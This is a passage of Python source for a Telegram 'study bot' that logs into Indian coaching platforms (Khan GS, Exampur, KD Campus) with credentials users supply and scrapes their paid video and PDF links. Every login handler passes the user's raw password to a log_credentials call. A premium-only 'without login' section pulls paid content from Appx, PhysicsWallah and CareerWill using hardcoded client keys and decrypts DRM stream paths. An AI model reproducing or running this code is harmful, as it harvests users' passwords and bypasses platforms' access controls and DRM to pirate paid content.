    prog = await update.message.reply_text("⏳ *Khan GS login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "Khan GS", user_input)
    if "*" not in user_input:
        await safe_edit(prog, "❌ *Format: `Phone*Password`*"); return LOGIN_MENU
    try:
        phone, pwd = user_input.split("*",1)
        hdrs = {"Host":"khanglobalstudies.com","content-type":"application/x-www-form-urlencoded","user-agent":"okhttp/3.9.1"}
        lr = session.post(KHAN_LOGIN_URL, data={"phone":phone,"password":pwd}, headers=hdrs, timeout=25)
        data = lr.json(); token = data.get("token")
        if not token: await safe_edit(prog, "❌ *Login fail!*"); return LOGIN_MENU
        hdrs["authorization"] = f"Bearer {token}"
        cr = session.get("https://khanglobalstudies.com/api/user/v2/courses", headers=hdrs, timeout=25)
        courses = cr.json()
        if not courses: await safe_edit(prog, "❌ *Koi course nahi!*"); return ConversationHandler.END
        all_lines = []
        for course in courses:
            cid = course["id"]; cname = course["title"]
            lr2 = session.get(f"https://khanglobalstudies.com/api/user/courses/{cid}/v2-lessons", headers=hdrs, timeout=25)
            lessons = lr2.json()
            for lesson in lessons:
                lid = lesson.get("id"); lname = lesson.get("name","?")
                ld = session.get(f"https://khanglobalstudies.com/api/lessons/{lid}", headers=hdrs, timeout=25)
                ldata = ld.json()
                for v in ldata.get("videos",[]):
                    url = v.get("video_url",""); vname = v.get("name","?")
                    if url: all_lines.append(f"[{cname} > {lname}] {vname} : {url}")
                for n in ldata.get("notes",[]):
                    url = n.get("url",""); nname = n.get("name","?")
                    if url: all_lines.append(f"[{cname} > {lname}] PDF | {nname} : {url}")
        if all_lines:
            fname = f"KhanGS_{safe_fn(phone)}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *Khan GS*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Content nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  EXAMPUR HANDLER
# ══════════════════════════════════════════════════════
async def exampur_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
    prog = await update.message.reply_text("⏳ *Exampur login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "Exampur", user_input)
    try:
        hdrs = {"appauthtoken": "no_token", "User-Agent": "Dart/2.15(dart:io)",
                "content-type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip",
                "host": "auth.exampurcache.xyz"}
        if "*" in user_input:
            email, pwd = user_input.split("*",1)
            lr = session.post(EXAMPUR_LOGIN_URL,
                json={"phone_ext":"91","phone":"","email":email,"password":pwd}, headers=hdrs, timeout=25)
            data = lr.json(); token = data.get("data",{}).get("token") if data.get("data") else None
            if not token: await safe_edit(prog, "❌ *Login fail!*"); return LOGIN_MENU
        else:
            token = user_input
        auth_hdrs = {"appauthtoken": token, "User-Agent": "Dart/2.15(dart:io)", "Accept-Encoding": "gzip"}
        cr = session.get("https://auth.exampurcache.xyz/api/v1/user/subscriptions", headers=auth_hdrs, timeout=25)
        subs = cr.json().get("data", [])
        all_lines = []
        for sub in subs:
            sid = sub.get("id"); sname = sub.get("name","?")
            vr = session.get(f"https://auth.exampurcache.xyz/api/v1/batch/{sid}/videos", headers=auth_hdrs, timeout=25)
            videos = vr.json().get("data",[])
            for v in videos:
                vname = v.get("title","?"); url = v.get("url","")
                if url: all_lines.append(f"[{sname}] {vname} : {url}")
        if all_lines:
            fname = f"Exampur_{safe_fn(user_input[:20])}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *Exampur*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"✅ *Login OK!*\n\n🔑 Token:\n`{token}`\n\n⚠️ Content nahi mila.", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  KD CAMPUS HANDLER
# ══════════════════════════════════════════════════════
async def kd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip(); user = update.effective_user
    prog = await update.message.reply_text("⏳ *KD Campus login ho raha hai...*", parse_mode=ParseMode.MARKDOWN)
    await log_credentials(context.bot, user, "KD Campus", user_input)
    try:
        if "*" in user_input:
            uid_inp, pwd = user_input.split("*",1)
            import hashlib
            pwd_hash = hashlib.md5(pwd.encode()).hexdigest()
            hdrs = {"Content-Type": "application/json", "api-key": "kdc123",
                    "User-Agent": "Mozilla/5.0"}
            lr = session.post(KD_LOGIN_URL, json={"username": uid_inp, "password": pwd_hash}, headers=hdrs, timeout=25)
            data = lr.json(); token = data.get("data",{}).get("token") if data.get("data") else None
            if not token:
                # Try plain password
                lr2 = session.post(KD_LOGIN_URL, json={"username": uid_inp, "password": pwd}, headers=hdrs, timeout=25)
                data = lr2.json(); token = data.get("data",{}).get("token") if data.get("data") else None
            if not token: await safe_edit(prog, "❌ *Login fail!*"); return LOGIN_MENU
        else:
            token = user_input
        auth_hdrs = {"Authorization": f"Bearer {token}", "api-key": "kdc123", "User-Agent": "Mozilla/5.0"}
        cr = session.get("https://api.kdcampus.live/api/v1/course/all-purchased", headers=auth_hdrs, timeout=25)
        courses = cr.json().get("data",[])
        all_lines = []
        for course in courses:
            cid = course.get("id"); cname = course.get("name","?")
            vr = session.get(f"https://api.kdcampus.live/api/v1/course/{cid}/videos", headers=auth_hdrs, timeout=25)
            videos = vr.json().get("data",[])
            for v in videos:
                vname = v.get("title","?"); url = v.get("url","")
                if url: all_lines.append(f"[{cname}] {vname} : {url}")
        if all_lines:
            fname = f"KDCampus_{safe_fn(user_input[:20])}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *KD Campus*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"✅ *Login OK!*\n\n🔑 Token:\n`{token}`\n\n⚠️ Content nahi mila.", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  ──────────────────────────────────────────────────
#  WITHOUT LOGIN EXTRACTORS (Premium only)
#  ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════

async def nologin_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id
    if not is_premium(uid): await send_not_premium(q.message); return EXTRACT_MENU

    if q.data == "ext_back" or q.data == "back_home":
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data == "nlx_cw":
        await cw_show_page(q, context, page=0, fresh=False); return CW_BROWSE
    elif q.data == "nlx_sw":
        await sw_show_page(q, context, page=0, fresh=False); return SW_BROWSE
    elif q.data == "nlx_iq":
        await iq_show_sub_menu(q.message); return IQ_MENU
    elif q.data == "nlx_fappx":
        await safe_edit(q.message,
            "📱 *FreeAppx Extractor*\n\n"
            "Appx credentials bhejo:\n\n"
            "📌 Format: `API_URL*USER_ID*TOKEN`\n\n"
            "Ya sirf `USER_ID*TOKEN` bhejo\n\n"
            "_/cancel to go back_")
        return FAPPX_STATE
    elif q.data == "nlx_fpw":
        await safe_edit(q.message,
            "✏️ *Free PW Extractor*\n\n"
            "PW Batch ID bhejo:\n\n"
            "📌 Format: `BATCH_ID`\n\n"
            "_/cancel to go back_")
        return FPW_STATE
    elif q.data == "nlx_kgs":
        await kgs_show_courses(q, context, fresh=False); return KGS_BROWSE
    return NOLOGIN_MENU

# ── FreeAppx Handler ──
async def fappx_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    prog = await update.message.reply_text("⏳ *FreeAppx extracting...*", parse_mode=ParseMode.MARKDOWN)
    try:
        parts = user_input.split("*")
        if len(parts) == 3: api_url, user_id, token = parts
        elif len(parts) == 2: api_url = "https://api.appx.co.in"; user_id, token = parts
        else: await safe_edit(prog, "❌ *Invalid format!*"); return FAPPX_STATE

        hdrs = {"Authorization": f"Bearer {token}", "User-Agent": "okhttp/3.12.1"}
        cr = session.get(f"{api_url}/get/course?user_id={user_id}", headers=hdrs, timeout=25)
        courses = cr.json().get("data", [])
        all_lines = []
        for course in courses:
            cid = course.get("id",""); cname = course.get("course_name","?")
            # Get folders
            fr = session.get(f"{api_url}/get/folder_contentsv2?course_id={cid}&parent_id=0", headers=hdrs, timeout=25)
            folders = fr.json().get("data", [])
            for item in folders:
                title = item.get("Title","?"); mid = item.get("id"); mt = item.get("material_type","")
                if mt == "VIDEO":
                    dr = session.get(f"{api_url}/get/fetchVideoDetailsById?course_id={cid}&video_id={mid}&ytflag=0&folder_wise_course=0", headers=hdrs, timeout=25)
                    vdata = dr.json().get("data")
                    if vdata:
                        mr = session.get(f"{api_url}/get/get_mpd_drm_links?videoid={mid}&folder_wise_course=0", headers=hdrs, timeout=25)
                        drm = mr.json().get("data", [])
                        if drm:
                            path = appx_decrypt(drm[0].get("path",""))
                            if path: all_lines.append(f"[{cname}] {title} : {path}")
                elif mt in ("PDF","TEST"):
                    pdf = appx_decrypt(item.get("pdf_link",""))
                    if pdf: all_lines.append(f"[{cname}] PDF | {title} : {pdf}")
        if all_lines:
            fname = f"FreeAppx_{user_id}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *FreeAppx*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Content nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ── Free PW Handler ──
async def fpw_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bid = update.message.text.strip()
    prog = await update.message.reply_text("⏳ *Free PW extracting...*", parse_mode=ParseMode.MARKDOWN)
    try:
        hdrs = {"Client-Id": "5eb393ee95fab7468a79d189", "Client-Type": "3", "User-Agent": "okhttp/4.9.2"}
        dr = session.get(f"https://api.penpencil.co/v3/batches/{bid}/details", headers=hdrs, timeout=25)
        data = dr.json(); bname = data.get("data",{}).get("name","Unknown")
        subjects = data.get("data",{}).get("subjects",[])
        all_lines = []
        for subj in subjects:
            sid = subj.get("_id"); sname = subj.get("subject","?")
            for page in range(1, 6):
                cr = session.get(
                    f"https://api.penpencil.co/v2/batches/{bid}/subject/{sid}/contents?page={page}&contentType=exercises-notes-videos",
                    headers=hdrs, timeout=25)
                items = cr.json().get("data",[])
                if not items: break
                for item in items:
                    topic = item.get("topic","?"); url = item.get("url","")
                    if url: all_lines.append(f"[{sname}] {topic} : {url}")
        if all_lines:
            fname = f"FreePW_{safe_fn(bname)}.txt"
            fb = BytesIO("\n".join(all_lines).encode()); fb.name = fname
            await update.message.reply_document(document=fb, filename=fname,
                caption=f"📂 *Free PW — {bname}*\n📦 `{len(all_lines)}` links\n\n_VIP Study Bot ⚡_",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ *Content nahi mila! Batch ID check karo.*", parse_mode=ParseMode.MARKDOWN)
        try: await prog.delete()
        except: pass
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")
    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  KGS APP EXTRACT (Without Login) + STUDY MODE
# ══════════════════════════════════════════════════════

def kgs_courses_kb(courses, page):
    tp = max(1, (len(courses)+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s = page*BATCHES_PER_PAGE; e = s+BATCHES_PER_PAGE; kb = []
    for c in courses[s:e]:
        cid = c.get("id",""); title = c.get("title","Unknown")
        lbl = title[:46]+"…" if len(title)>46 else title
        kb.append([InlineKeyboardButton(f"🎓 {lbl}", callback_data=f"kgs_ex_{cid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"kgs_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}", callback_data="noop"))
    if e < len(courses): nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"kgs_pg_{page+1}"))
    kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="nlx_back")])
    return InlineKeyboardMarkup(kb)

async def kgs_show_courses(q, context, fresh=True):
    if "kgs_courses" not in context.user_data:
        prog = await q.message.reply_text("⏳ *KGS courses load ho rahe hain...*", parse_mode=ParseMode.MARKDOWN)
        raw = fetch_json(KGS_COURSES_URL)
        if not raw:
            await safe_edit(prog, "❌ *KGS API se data nahi mila!*"); return
        courses = raw.get("courses", []) if isinstance(raw, dict) else raw
        context.user_data["kgs_courses"] = courses
        try: await prog.delete()
        except: pass
    courses = context.user_data["kgs_courses"]; total = len(courses)
    tp = max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    txt = f"🎓 *KGS App — All Courses*\n\n📦 Total: `{total}` | 📄 `1/{tp}`\n\n_Course choose karo 👇_"
    mk = kgs_courses_kb(courses, 0)
    if fresh: await q.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=mk)
    else: await safe_edit(q.message, txt, markup=mk)

async def kgs_browse_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id
    if not is_premium(uid): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("kgs_pg_"):
        page = int(q.data[7:])
        courses = context.user_data.get("kgs_courses", [])
        total = len(courses); tp = max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
        txt = f"🎓 *KGS App — All Courses*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Course choose karo 👇_"
        await safe_edit(q.message, txt, markup=kgs_courses_kb(courses, page))
        return KGS_BROWSE
    elif q.data.startswith("kgs_ex_"):
        cid = q.data[7:]
        courses = context.user_data.get("kgs_courses", [])
        cname = next((c.get("title","?") for c in courses if str(c.get("id",""))==str(cid)), "Unknown")
        await kgs_do_extract(q.message, cid, cname)
        return ConversationHandler.END
    elif q.data in ("nlx_back", "back_home"):
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data == "noop": return KGS_BROWSE
    return KGS_BROWSE

async def kgs_do_extract(message, cid, cname):
    """Full extraction: courses → subjects → lessons → videos + PDFs → TXT file."""
    prog = await message.reply_text(
        f"✅ *Course Select!*\n\n📌 *{cname}*\n\n⏳ Subjects load ho rahe hain...",
        parse_mode=ParseMode.MARKDOWN)
    t0 = time.time()
    try:
        subjects = fetch_json(KGS_SUBJECTS_URL.format(cid))
        if not subjects or not isinstance(subjects, list):
            await safe_edit(prog, "❌ *Subjects nahi mile!*"); return
        await safe_edit(prog,
            f"📌 *{cname}*\n\n📂 Subjects: `{len(subjects)}`\n\n⚙️ Lessons extract ho rahe hain...")
        all_lines = []; tv = tp = fv = fp = 0
        for subj in subjects:
            sid = subj.get("id",""); sname = subj.get("name","?")
            lessons = fetch_json(KGS_LESSONS_URL.format(sid))
            if not lessons or not isinstance(lessons, list):
                continue
            for les in lessons:
                lname = les.get("name","?")
                # Video
                vid_url = les.get("video_url","")
                if vid_url:
                    all_lines.append(f"[{sname}] Video | {lname} : {vid_url}"); tv += 1
                else:
                    fv += 1
                # PDF
                pdf_data = les.get("pdfs")
                if pdf_data and isinstance(pdf_data, dict):
                    pdf_url = pdf_data.get("url","")
                    if pdf_url:
                        all_lines.append(f"[{sname}] PDF | {lname} : {pdf_url}"); tp += 1
                    else:
                        fp += 1
        elapsed = time.time()-t0
        if not all_lines:
            await safe_edit(prog, "❌ *Koi content nahi mila!*"); return
        await send_result(message, prog, all_lines, cname, str(cid), tv, tp, fv, fp, [], t0, "KGS App")
    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")

# ── KGS Study Mode ──
def kgs_study_courses_kb(courses, page):
    tp = max(1,(len(courses)+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s = page*BATCHES_PER_PAGE; e = s+BATCHES_PER_PAGE; kb = []
    for c in courses[s:e]:
        cid = c.get("id",""); title = c.get("title","Unknown")
        lbl = title[:46]+"…" if len(title)>46 else title
        kb.append([InlineKeyboardButton(f"🎓 {lbl}", callback_data=f"skgs_c_{cid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️", callback_data=f"skgs_cpg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}", callback_data="noop"))
    if e < len(courses): nav.append(InlineKeyboardButton("➡️", callback_data=f"skgs_cpg_{page+1}"))
    kb.append(nav); kb.append([InlineKeyboardButton("🔙 Back", callback_data="back_home")])
    return InlineKeyboardMarkup(kb)

async def study_kgs_courses_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU

    if q.data == "study_kgs":
        if "kgs_courses" not in context.user_data:
            prog = await q.message.reply_text("⏳ *KGS courses...*", parse_mode=ParseMode.MARKDOWN)
            raw = fetch_json(KGS_COURSES_URL)
            if not raw:
                await safe_edit(prog, "❌ *KGS API fail!*"); return STUDY_MENU
            courses = raw.get("courses",[]) if isinstance(raw,dict) else raw
            context.user_data["kgs_courses"] = courses
            try: await prog.delete()
            except: pass
        courses = context.user_data["kgs_courses"]; total = len(courses)
        tp = max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
        txt = f"🎓 *KGS App Study*\n\n📦 `{total}` courses | 📄 `1/{tp}`\n\n_Course choose karo 👇_"
        await q.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN,
            reply_markup=kgs_study_courses_kb(courses, 0))
        return STUDY_KGS_COURSES

    elif q.data.startswith("skgs_cpg_"):
        page = int(q.data[9:])
        courses = context.user_data.get("kgs_courses",[])
        total = len(courses); tp = max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
        await safe_edit(q.message, f"🎓 *KGS App Study*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Course choose karo 👇_",
            markup=kgs_study_courses_kb(courses, page))
        return STUDY_KGS_COURSES

    elif q.data.startswith("skgs_c_"):
        cid = q.data[7:]
        courses = context.user_data.get("kgs_courses",[])
        cname = next((c.get("title","?") for c in courses if str(c.get("id",""))==str(cid)), "Unknown")
        context.user_data["skgs_cid"] = cid; context.user_data["skgs_cname"] = cname
        # Load subjects
        prog = await q.message.reply_text("⏳ *Subjects load ho rahe hain...*", parse_mode=ParseMode.MARKDOWN)
        subjects = fetch_json(KGS_SUBJECTS_URL.format(cid))
        if not subjects or not isinstance(subjects, list):
            await safe_edit(prog, "❌ *Subjects nahi mile!*"); return STUDY_KGS_COURSES
        context.user_data["skgs_subjects"] = subjects
        kb = []
        for subj in subjects[:25]:
            sid = subj.get("id",""); sname = subj.get("name","?")
            vc = subj.get("videos", 0)
            key = f"skgs_s_{sid}"
            kb.append([InlineKeyboardButton(f"📂 {sname} ({vc} videos)", callback_data=key)])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="study_kgs")])
        await safe_edit(prog,
            f"🎓 *{cname}*\n\n📂 `{len(subjects)}` subjects\n\n_Subject choose karo 👇_",
            markup=InlineKeyboardMarkup(kb))
        return STUDY_KGS_SUBJECTS

    elif q.data in ("back_home","noop"): return STUDY_KGS_COURSES
    return STUDY_KGS_COURSES

async def study_kgs_subjects_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU

    if q.data.startswith("skgs_s_"):
        sid = q.data[7:]
        subjects = context.user_data.get("skgs_subjects",[])
        sname = next((s.get("name","?") for s in subjects if str(s.get("id",""))==str(sid)), "Subject")
        context.user_data["skgs_sid"] = sid; context.user_data["skgs_sname"] = sname
        prog = await q.message.reply_text("⏳ *Lessons load ho rahe hain...*", parse_mode=ParseMode.MARKDOWN)
        lessons = fetch_json(KGS_LESSONS_URL.format(sid))
        if not lessons or not isinstance(lessons, list):
            await safe_edit(prog, "❌ *Lessons nahi mile!*"); return STUDY_KGS_SUBJECTS
        context.user_data["skgs_lessons"] = {}
        kb = []
        for les in lessons[:30]:
            lid = les.get("id",""); lname = les.get("name","?")
            key = f"skgs_l_{lid}"
            context.user_data["skgs_lessons"][key] = les
            kb.append([InlineKeyboardButton(f"🎬 {lname[:50]}", callback_data=key)])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data=f"skgs_c_{context.user_data.get('skgs_cid','')}")])
        cname = context.user_data.get("skgs_cname","Course")
        await safe_edit(prog,
            f"📂 *{sname}*\n🎓 {cname}\n\n🎬 `{len(lessons)}` lessons\n\n_Lesson choose karo 👇_",
            markup=InlineKeyboardMarkup(kb))
        return STUDY_KGS_LESSONS

    elif q.data.startswith("skgs_c_"):
        return await study_kgs_courses_handler(update, context)
    elif q.data in ("back_home","noop"): return STUDY_KGS_SUBJECTS
    return STUDY_KGS_SUBJECTS

async def study_kgs_lessons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU

    if q.data.startswith("skgs_l_"):
        les = context.user_data.get("skgs_lessons",{}).get(q.data)
        if not les: await q.answer("❌ Data nahi mila!", show_alert=True); return STUDY_KGS_LESSONS
        lname = les.get("name","?")
        vid_url = les.get("video_url","")
        pdf_data = les.get("pdfs")
        pdf_url = pdf_data.get("url","") if isinstance(pdf_data,dict) else ""
        sname = context.user_data.get("skgs_sname","Subject")
        cname = context.user_data.get("skgs_cname","Course")
        context.user_data["skgs_cur_les"] = les
        kb_rows = []
        if vid_url:
            kb_rows.append([InlineKeyboardButton("📥 Video Download & Upload", callback_data="skgs_vid_dl")])
            kb_rows.append([InlineKeyboardButton("🔗 Video Link", callback_data="skgs_vid_lk")])
        if pdf_url:
            kb_rows.append([InlineKeyboardButton("📄 PDF Link", callback_data="skgs_pdf_lk")])
        if not kb_rows:
            await q.message.reply_text(
                f"🎬 *{lname}*\n\n⚠️ *Is lesson mein koi video ya PDF nahi hai!*",
                parse_mode=ParseMode.MARKDOWN); return STUDY_KGS_LESSONS
        kb_rows.append([InlineKeyboardButton("🔙 Back", callback_data=f"skgs_s_{context.user_data.get('skgs_sid','')}")])
        await q.message.reply_text(
            f"🎬 *{lname}*\n📂 {sname}\n🎓 {cname}\n\n_Kya karna hai? 👇_",
            parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb_rows))
        return STUDY_KGS_LESSONS

    elif q.data == "skgs_vid_lk":
        les = context.user_data.get("skgs_cur_les",{})
        url = les.get("video_url","")
        if url: await q.message.reply_text(f"🔗 *Video Link:*\n\n`{url}`\n\n_Copy karke download karo 👆_", parse_mode=ParseMode.MARKDOWN)
        else: await q.message.reply_text("❌ *Video link nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        return STUDY_KGS_LESSONS

    elif q.data == "skgs_vid_dl":
        les = context.user_data.get("skgs_cur_les",{})
        url = les.get("video_url","")
        lname = les.get("name","Video")
        sname = context.user_data.get("skgs_sname","Subject")
        cname = context.user_data.get("skgs_cname","Course")
        if not url: await q.message.reply_text("❌ *Link nahi!*", parse_mode=ParseMode.MARKDOWN); return STUDY_KGS_LESSONS
        await download_and_upload_video(q.message, url, lname, sname, cname)
        return STUDY_KGS_LESSONS

    elif q.data == "skgs_pdf_lk":
        les = context.user_data.get("skgs_cur_les",{})
        pdf_data = les.get("pdfs")
        url = pdf_data.get("url","") if isinstance(pdf_data,dict) else ""
        if url: await q.message.reply_text(f"📄 *PDF Link:*\n\n`{url}`\n\n_Click karke open karo 👆_", parse_mode=ParseMode.MARKDOWN)
        else: await q.message.reply_text("❌ *PDF link nahi mila!*", parse_mode=ParseMode.MARKDOWN)
        return STUDY_KGS_LESSONS

    elif q.data.startswith("skgs_s_"):
        return await study_kgs_subjects_handler(update, context)
    elif q.data in ("back_home","noop"): return STUDY_KGS_LESSONS
    return STUDY_KGS_LESSONS

# ══════════════════════════════════════════════════════
#  CAREERWILL EXTRACT (Without Login)
# ══════════════════════════════════════════════════════
def cw_kb(batches, page):
    tp = max(1,(len(batches)+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s=page*BATCHES_PER_PAGE; e=s+BATCHES_PER_PAGE; kb=[]
    for bid,bname in batches[s:e]:
        lbl = bname[:46]+"…" if len(bname)>46 else bname
        kb.append([InlineKeyboardButton(f"📚 {lbl}", callback_data=f"cw_ex_{bid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"cw_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}", callback_data="noop"))
    if e<len(batches): nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"cw_pg_{page+1}"))
    kb.append(nav)
    kb.append([InlineKeyboardButton("🔍 Search", callback_data="cw_search"),
               InlineKeyboardButton("🔙 Back",   callback_data="nlx_back")])
    return InlineKeyboardMarkup(kb)

async def cw_show_page(q, context, page, fresh):
    if "cw_batches" not in context.user_data:
        prog = await q.message.reply_text("⏳ *CareerWill batches...*", parse_mode=ParseMode.MARKDOWN)
        raw = fetch_json(CW_ALL_BATCHES)
        if not raw: await safe_edit(prog, "❌ *Failed!*"); return
        context.user_data["cw_batches"] = sorted(raw.items(), key=lambda x: int(x[0]), reverse=True)
        await prog.delete()
    batches = context.user_data["cw_batches"]; total = len(batches)
    tp = max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    txt = f"🎯 *CareerWill — All Batches*\n\n📦 Total: `{total}` | 📄 `{page+1}/{tp}`\n\n_Batch choose karo 👇_"
    mk = cw_kb(batches, page)
    if fresh: await q.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=mk)
    else: await safe_edit(q.message, txt, markup=mk)

async def cw_browse_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id
    if not is_premium(uid): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("cw_pg_"):
        await cw_show_page(q, context, int(q.data[6:]), False); return CW_BROWSE
    elif q.data == "cw_search":
        await q.message.reply_text("🔍 *Search:*\n\nBatch name type karo:", parse_mode=ParseMode.MARKDOWN)
        return CW_SEARCH_INPUT
    elif q.data.startswith("cw_ex_"):
        bid = q.data[6:]
        bname = next((n for i,n in context.user_data.get("cw_batches",[]) if i==bid),"Unknown")
        await cw_do_extract(q.message, bid, bname); return ConversationHandler.END
    elif q.data in ("nlx_back","back_home"):
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data == "noop": return CW_BROWSE
    return CW_BROWSE

async def cw_search_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_premium(update.effective_user.id): await send_not_premium(update.message); return ConversationHandler.END
    kw = update.message.text.strip().lower()
    batches = context.user_data.get("cw_batches",[])
    res = [(i,n) for i,n in batches if kw in n.lower()]
    if not res: await update.message.reply_text(f"❌ *`{kw}` nahi mila.*", parse_mode=ParseMode.MARKDOWN); return CW_SEARCH_INPUT
    kb = [[InlineKeyboardButton(f"📚 {n[:46]}", callback_data=f"cw_ex_{i}")] for i,n in res[:15]]
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="cw_pg_0")])
    await update.message.reply_text(f"🔍 `{kw}` — `{len(res)}` mila\n\n_Tap to extract 👇_",
        parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
    return CW_BROWSE

def cw_process_topic(bid, topic):
    tid = topic.get("id"); tname = topic.get("topicName","Unknown"); res=[]; vo=po=vf=pf=0
    data = fetch_json(CW_TOPIC_API.format(bid,tid))
    if not data: return res,vo,po,vf,pf
    for cls in data.get("classes",[]):
        title=cls.get("title","?"); cno=cls.get("class_no","?"); vid=cls.get("video_url")
        if vid:
            url = get_cw_video_url(vid)
            if url: res.append(f"[{tname}] Class {cno} | {title} : {url}"); vo+=1
            else: res.append(f"[{tname}] Class {cno} | {title} : ❌ FAILED"); vf+=1
    for note in data.get("notes",[]):
        title=note.get("title","?")
        pdf=(note.get("view_url") or note.get("download_url") or note.get("file_url") or note.get("pdf_url"))
        if pdf: res.append(f"[{tname}] PDF | {title} : {pdf}"); po+=1
        else: res.append(f"[{tname}] PDF | {title} : ❌ FAILED"); pf+=1
    return res,vo,po,vf,pf

async def cw_do_extract(message, bid, bname):
    prog = await message.reply_text(f"✅ *Batch Select!*\n\n📌 *{bname}*\n\n⏳ Topics...", parse_mode=ParseMode.MARKDOWN)
    batch = fetch_json(CW_BATCH_API.format(bid))
    if not batch: await safe_edit(prog,"❌ *Batch load nahi hua!*"); return
    topics = batch.get("topics",[])
    if not topics: await safe_edit(prog,f"⚠️ *Koi topic nahi: `{bname}`*"); return
